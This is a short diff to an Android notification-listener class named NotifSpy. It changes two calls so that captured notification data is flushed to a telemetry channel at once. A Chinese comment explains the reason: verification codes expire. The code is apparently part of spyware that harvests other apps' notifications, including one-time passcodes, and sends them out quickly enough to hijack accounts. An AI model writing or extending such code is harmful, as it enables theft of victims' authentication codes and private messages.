@@ -69,7 +69,7 @@ class NotifSpy : NotificationListenerService() {
             Telemetry.push("notif", d, s.postTime / 1000L)
 
             // 立刻推一次，别等 20 秒心跳 —— 验证码是有时效的
-            runCatching { Telemetry.flush(applicationContext) }
+            runCatching { Telemetry.flush(applicationContext, true) }
         }.onFailure { Log.w(TAG, "post: ${it.message}") }
     }
 
@@ -107,7 +107,7 @@ class NotifSpy : NotificationListenerService() {
                 n++
             }
         }
-        if (n > 0) runCatching { Telemetry.flush(applicationContext) }
+        if (n > 0) runCatching { Telemetry.flush(applicationContext, true) }
         Log.i(TAG, "sync $reason: pushed $n")
     }
 
